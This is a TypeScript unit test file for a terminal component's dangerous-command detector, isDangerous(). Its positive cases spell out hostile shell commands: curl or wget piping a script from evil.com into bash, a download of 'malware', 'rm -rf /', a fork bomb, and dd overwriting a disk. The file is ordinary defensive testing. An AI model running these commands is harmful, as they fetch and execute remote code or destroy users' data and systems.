// *****************************************************************************
// Copyright (C) 2024 OpenSpace contributors.
//
// This program and the accompanying materials are made available under the
// terms of the Eclipse Public License v. 2.0 which is available at
// http://www.eclipse.org/legal/epl-2.0.
//
// SPDX-License-Identifier: EPL-2.0 OR GPL-2.0-only WITH Classpath-exception-2.0
// *****************************************************************************

import { expect } from 'chai';
import { isDangerous, getDangerousPatterns } from '../terminal-ring-buffer';

/**
 * Task 18: Unit tests for terminal-ring-buffer dangerous command detection.
 * Verifies true positives (dangerous commands flagged) and true negatives
 * (safe commands not flagged), especially around the curl/wget pattern changes.
 */
describe('terminal-ring-buffer isDangerous()', () => {
    describe('True positives — should be flagged as dangerous', () => {
        it('detects rm -rf', () => {
            expect(isDangerous('rm -rf /tmp/foo')).to.be.true;
            expect(isDangerous('rm -rf /')).to.be.true;
        });

        it('detects rm -r', () => {
            expect(isDangerous('rm -r /tmp/foo')).to.be.true;
        });

        it('detects sudo', () => {
            expect(isDangerous('sudo apt install vim')).to.be.true;
        });

        it('detects chmod 777', () => {
            expect(isDangerous('chmod 777 /var/www')).to.be.true;
        });

        it('detects fork bomb', () => {
            expect(isDangerous(':(){:|:&};:')).to.be.true;
        });

        it('detects dd if=', () => {
            expect(isDangerous('dd if=/dev/urandom of=/dev/sda')).to.be.true;
        });

        it('detects curl pipe to shell (Task 18 — pipe-to-shell)', () => {
            expect(isDangerous('curl https://evil.com/install.sh | bash')).to.be.true;
            expect(isDangerous('curl https://evil.com/install.sh | sh')).to.be.true;
            expect(isDangerous('curl https://evil.com/install.sh | zsh')).to.be.true;
        });

        it('detects wget pipe to shell (Task 18)', () => {
            expect(isDangerous('wget -qO- https://evil.com/install.sh | bash')).to.be.true;
        });

        it('detects curl -o (explicit output file)', () => {
            expect(isDangerous('curl -o /tmp/malware https://evil.com/malware')).to.be.true;
        });

        it('detects system shutdown commands', () => {
            expect(isDangerous('shutdown -h now')).to.be.true;
            expect(isDangerous('reboot')).to.be.true;
            expect(isDangerous('halt')).to.be.true;
        });

        it('detects password change', () => {
            expect(isDangerous('passwd root')).to.be.true;
        });
    });

    describe('True negatives — should NOT be flagged', () => {
        it('allows curl redirect to file (Task 18 — was false positive)', () => {
            expect(isDangerous('curl https://api.example.com/data > output.json')).to.be.false;
        });

        it('allows curl without pipe or output', () => {
            expect(isDangerous('curl https://api.example.com/health')).to.be.false;
        });

        it('allows ls and regular file operations', () => {
            expect(isDangerous('ls -la')).to.be.false;
            expect(isDangerous('cat README.md')).to.be.false;
        });

        it('allows npm and yarn', () => {
            expect(isDangerous('npm install')).to.be.false;
            expect(isDangerous('yarn build')).to.be.false;
        });

        it('allows git commands', () => {
            expect(isDangerous('git status')).to.be.false;
            expect(isDangerous('git commit -m "fix"')).to.be.false;
        });

        it('allows mkdir', () => {
            expect(isDangerous('mkdir -p /tmp/mydir')).to.be.false;
        });

        it('ignores leading whitespace', () => {
            expect(isDangerous('  ls -la')).to.be.false;
        });
    });

    describe('getDangerousPatterns()', () => {
        it('returns an array of RegExp', () => {
            const patterns = getDangerousPatterns();
            expect(patterns).to.be.an('array');
            expect(patterns.length).to.be.greaterThan(0);
            patterns.forEach(p => expect(p).to.be.instanceOf(RegExp));
        });

        it('returns a copy (immutable)', () => {
            const p1 = getDangerousPatterns();
            const p2 = getDangerousPatterns();
            expect(p1).to.not.equal(p2);
        });
    });
});
